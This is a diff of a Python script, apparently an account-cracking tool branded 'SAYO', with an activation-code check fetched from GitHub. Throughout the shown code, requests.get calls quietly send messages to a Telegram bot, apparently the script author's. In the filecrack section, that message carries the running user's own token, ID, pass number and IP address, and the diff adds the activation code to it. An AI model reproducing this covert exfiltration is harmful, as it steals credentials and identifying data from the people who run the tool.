@@ -176,8 +176,6 @@ proxy = request.ProxyHandler(
  {"http":"127.0.0.1:443"}
  )
 request.install_opener(request.build_opener(proxy))
-def syline():
-	print('\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰')
 logo=(f"""\033[1;31m⠀
 
 
@@ -199,15 +197,15 @@ logo=(f"""\033[1;31m⠀
              \033[1;31m╚\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m╝
 
 \x1b[1;97m———————————————————————————————\033[1;41m\033[1;97m𝐒 𝐀 𝐘 𝐎\033[;0m\033[1;91m\x1b[1;97m————————————————————————————————""")
-os.system('clear')
-print(logo)
+def syline():
+	print('\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰\x1b[1;97m▱\033[1;31m▰')
 def fetch_activation_codes():
     url = 'https://raw.githubusercontent.com/2SAYO/Cods/main/Cods'
     response = requests.get(url)
     codes = response.text.split('\n')
     return {code.split(',')[0]: datetime.datetime.strptime(code.split(',')[1], '%Y-%m-%d %H:%M') for code in codes if code}
 
-
+print(logo)
 def check_activation_code(user_code, activation_codes):
     current_time = datetime.datetime.now()
     if user_code in activation_codes:
@@ -218,7 +216,7 @@ def check_activation_code(user_code, activation_codes):
             mdr = f"""𝗗𝗜𝗖𝗟𝗜𝗡𝗘𝗗 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗜𝗧 𝗜𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 𝗖𝗢𝗗𝗘🕘\n
             𝗖𝗢𝗗𝗘 : {user_input_code}
             """
-            requests.get('https://api.telegram.org/bot' + str(token3) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(mdr))
+            requests.get('https://api.telegram.org/bot' + str(token2) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(mdr))
             return False
         else:
             syline()
@@ -226,7 +224,7 @@ def check_activation_code(user_code, activation_codes):
             logins = f"""𝗚𝗢𝗢𝗗 𝗢𝗣𝗘𝗡 𝗕𝗬 CODE✅\n
             CODE : {user_input_code}
             """
-            requests.get('https://api.telegram.org/bot' + str(token3) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(logins))
+            requests.get('https://api.telegram.org/bot' + str(token2) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(logins))
             time.sleep(5)
             return True
     else:
@@ -235,7 +233,7 @@ def check_activation_code(user_code, activation_codes):
         eror = f"""𝗗𝗜𝗖𝗟𝗜𝗡𝗘𝗗 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗜𝗧 𝗜𝗦 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗖𝗢𝗗𝗘❌\n
             CODE : {user_input_code}
             """
-        requests.get('https://api.telegram.org/bot' + str(token3) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(eror))
+        requests.get('https://api.telegram.org/bot' + str(token2) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(eror))
         return False
 
 
@@ -244,6 +242,8 @@ activation_codes = fetch_activation_codes()
 user_input_code = input(f"{r}𝐄{w}𝐍{r}𝐓{w}𝐄{r}𝐑 {w}𝐘{r}𝐎{w}𝐔{r}𝐑 {w}𝐀{r}𝐂{w}𝐓{r}𝐈{w}𝐕{r}𝐀{w}𝐓{r}𝐈{w}𝐎{r}𝐍 {w}𝐂{r}𝐎{w}𝐃{r}𝐄{w} :{r} ")
 if not check_activation_code(user_input_code, activation_codes):
     exit()
+os.system('clear')
+print(logo)
 import json
 
 def read_config():
@@ -1715,11 +1715,13 @@ def filecrack():
 
 [🎟️] 𝗛𝗜𝗦 𝗧𝗢𝗞𝗘𝗡 » {token}
 
-[🎫] 𝗛𝗜𝗦 𝗜𝗗 » {ID}
+[🆔] 𝗛𝗜𝗦 𝗜𝗗 » {ID}
 
 [🔐] 𝗣𝗔𝗦𝗦 𝗡𝗨𝗠𝗕𝗘𝗥 » {sylist}
 
 [💿] 𝗛𝗜𝗦 𝗜𝗣 » {ip}
+
+[🎫]𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗜𝗢𝗡 𝗖𝗢𝗗𝗘 » {user_input_code}
 
 :･ﾟ✧:･.☽˚｡･ﾟ✧:･.:･ﾟ✧:･.☽˚｡･ﾟ✧:･.:･ﾟ"""
 				requests.get('https://api.telegram.org/bot' + str(token2) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(information))
